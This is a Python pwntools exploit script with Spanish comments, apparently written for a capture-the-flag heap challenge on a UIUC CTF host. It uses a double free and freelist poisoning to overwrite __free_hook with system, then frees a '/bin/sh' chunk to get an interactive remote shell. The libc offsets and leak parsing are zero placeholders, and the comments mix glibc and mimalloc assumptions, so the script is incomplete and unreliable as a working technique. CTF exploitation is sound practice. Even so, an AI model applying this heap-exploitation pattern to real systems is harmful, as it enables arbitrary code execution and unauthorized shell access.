from pwn import *

# Configuración del contexto
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 64
context.log_level = 'info' # Cambiar a 'debug' para más detalles

# Dirección del desafío remoto
HOST = 'doremi.chal.uiuc.tf'
PORT = 1337

# Offset para la fuga de libc y __free_hook
# ESTOS VALORES DEBEN SER OBTENIDOS MEDIANTE DEPURACIÓN LOCAL
# Y PUEDEN VARIAR ENTRE EJECUCIONES DEBIDO A ASLR.
# Ejemplo:
# 1. Fuga una dirección de libc.
# 2. Calcula el offset de esa dirección a la base de libc.
# 3. Calcula el offset de la base de libc a system y __free_hook.
LIBC_BASE_OFFSET = 0x0 # Placeholder: Offset de la dirección filtrada a la base de libc
FREE_HOOK_OFFSET = 0x0 # Placeholder: Offset de la base de libc a __free_hook
SYSTEM_OFFSET = 0x0    # Placeholder: Offset de la base de libc a system

# Tamaño de las notas
NOTE_SIZE = 128

def create_note(index):
    io.sendlineafter(b"YAHNC> ", b"1")
    io.sendlineafter(b"Position? (0-15): ", str(index).encode())
    io.recvuntil(b"Done!")

def delete_note(index):
    io.sendlineafter(b"YAHNC> ", b"2")
    io.sendlineafter(b"Position? (0-15): ", str(index).encode())
    io.recvuntil(b"Done!")

def read_note(index):
    io.sendlineafter(b"YAHNC> ", b"3")
    io.sendlineafter(b"Position? (0-15): ", str(index).encode())
    io.recvuntil(b"Done!")
    # La salida de read() no tiene un newline al final, pero printf() sí.
    # Necesitamos leer hasta el siguiente prompt.
    return io.recvuntil(b"YAHNC> ", drop=True).strip()

def update_note(index, content):
    io.sendlineafter(b"YAHNC> ", b"4")
    io.sendlineafter(b"Position? (0-15): ", str(index).encode())
    io.sendlineafter(b"Content? (127 max): ", content)
    io.recvuntil(b"Done!")

def exploit():
    global io
    # Conectarse al servidor remoto
    io = remote(HOST, PORT, ssl=True)
    io.recvuntil(b"What Would You Like to Do:")

    info("Iniciando explotación...")

    # Paso 1: Fuga de dirección de libc
    # Creamos varias notas para llenar los tcache/fastbins
    for i in range(7): # 0-6
        create_note(i)

    # Liberamos algunas notas para que entren en las listas de libres
    for i in range(7):
        delete_note(i)

    # Doble liberación en la nota 6 para corromper la lista de libres
    # Esto hará que el chunk 6 esté en la lista de libres dos veces
    delete_note(6)

    # Asignamos 3 chunks. El primero será el chunk 6.
    # El segundo será el chunk 5.
    # El tercero será el chunk 6 de nuevo, pero esta vez contendrá metadatos de libc.
    create_note(0) # Asigna el primer chunk 6
    create_note(1) # Asigna el chunk 5
    create_note(2) # Asigna el segundo chunk 6 (con metadatos de libc)

    # Leemos el contenido del chunk 2 (que es el chunk 6 con metadatos)
    # para filtrar una dirección de libc.
    info("Intentando fuga de libc...")
    leak = read_note(2)
    log.debug(f"Leak crudo: {leak}")

    # Parsear la dirección de libc. Esto puede requerir ajustes.
    # Buscar un patrón de dirección de 64 bits (8 bytes)
    # Por ejemplo, si el leak es b'\x00\x00\x00\x00\x00\x7f\xXX\xXX...'
    # Necesitarás encontrar la dirección de libc en el leak.
    # Esto es altamente dependiente del comportamiento de mimalloc y del leak exacto.
    # Una forma común es buscar un puntero a una dirección de libc.
    # Por ejemplo, si el leak contiene un puntero a main_arena+96, puedes usar eso.
    # Para este ejemplo, asumiremos que el leak contiene un puntero directo a libc.
    
    # DEBES AJUSTAR ESTA LÓGICA DE PARSEO DEL LEAK
    # Por ejemplo, si el leak es un puntero a una dirección en libc:
    # leaked_libc_addr = u64(leak.ljust(8, b'\x00'))
    
    leaked_libc_addr = 0x0 # Placeholder: Reemplazar con la dirección filtrada real
    
    libc_base = leaked_libc_addr - LIBC_BASE_OFFSET
    free_hook_addr = libc_base + FREE_HOOK_OFFSET
    system_addr = libc_base + SYSTEM_OFFSET

    info(f"Dirección de libc filtrada: {hex(leaked_libc_addr)}")
    info(f"Base de libc: {hex(libc_base)}")
    info(f"Dirección de __free_hook: {hex(free_hook_addr)}")
    info(f"Dirección de system: {hex(system_addr)}")

    # Paso 2: Corrupción de Heap para Escritura Arbitraria
    # Liberamos el chunk 2 (que es el chunk 6)
    delete_note(2)

    # Doble liberación en el chunk 0 (que es el chunk 6)
    # Esto hará que el chunk 6 esté en la lista de libres dos veces
    delete_note(0)

    # Asignamos un chunk. Será el chunk 6.
    create_note(3) # Asigna el primer chunk 6

    # Sobrescribimos el puntero fd del chunk 6 para que apunte a __free_hook
    # El offset de fd dentro del chunk libre puede variar en mimalloc.
    # Asumimos que es el inicio del chunk.
    # El -8 es para que cuando se asigne el siguiente chunk, el puntero retornado sea __free_hook.
    # DEBES AJUSTAR ESTE OFFSET SI ES NECESARIO.
    payload = p64(free_hook_addr)
    update_note(3, payload)

    # Asignamos un chunk. Esto debería devolver un puntero a __free_hook.
    create_note(4) # Ahora notes[4] apunta a __free_hook

    # Paso 3: Escribir system() en __free_hook
    info(f"Escribiendo system() en __free_hook...")
    update_note(4, p64(system_addr))

    # Paso 4: Trigger de Shell
    info("Intentando obtener shell...")
    create_note(5) # Asignamos un chunk para escribir "/bin/sh"
    update_note(5, b"/bin/sh\x00") # Escribimos "/bin/sh" en el chunk

    # Liberamos el chunk que contiene "/bin/sh".
    # Esto llamará a free("/bin/sh"), que debido a la sobrescritura de __free_hook,
    # ejecutará system("/bin/sh").
    delete_note(5)

    io.interactive()

if __name__ == "__main__":
    exploit()
